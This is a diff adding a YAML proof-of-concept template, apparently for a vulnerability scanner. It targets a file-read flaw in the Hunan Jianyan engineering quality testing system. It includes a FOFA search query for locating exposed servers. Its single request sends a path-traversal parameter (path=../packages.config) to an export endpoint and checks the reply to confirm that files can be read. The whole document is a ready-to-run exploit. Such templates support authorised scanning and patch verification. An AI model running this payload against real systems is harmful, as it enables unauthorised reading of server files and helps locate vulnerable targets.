@@ -1,0 +1,17 @@
+id: poc-yaml-hunanjianyan-instrumentusagerecordexport-fileread
+info:
+  name: 湖南建研工程质量检测系统 /Applications/Forms/Custom/InstrumentUsageRecordExport.cshtml
+    文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 湖南建研检测系统
+  fofa: body="/Content/Theme/Standard/"
+variables:
+  time: datetime("2006-01-02")
+requests:
+- method: GET
+  path: /Applications/Forms/Custom/InstrumentUsageRecordExport.cshtml?act=down&path=../packages.config
+  expression: "status_code == 200 && \n!contains(body,\"<html\") &&\ncontains(headers,\"\
+    application/pdf\") &&\ncontains(headers,time + \".pdf\")\n"
+transport: http
